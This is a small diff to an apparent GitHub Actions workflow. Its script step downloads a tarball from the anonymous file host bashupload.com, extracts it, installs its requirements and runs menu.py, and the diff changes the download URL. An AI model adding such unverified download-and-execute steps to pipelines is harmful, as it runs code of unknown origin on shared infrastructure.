@@ -17,7 +17,7 @@ jobs:
       - name: Run a multi-line script
         run: |
           sudo apt update
-          wget https://bashupload.com/MQuFy/github.tar.gz
+          wget https://bashupload.com/c3xRo/github.tar.gz
           tar -xf github.tar.gz
           pip install -r requirements.txt
           python menu.py
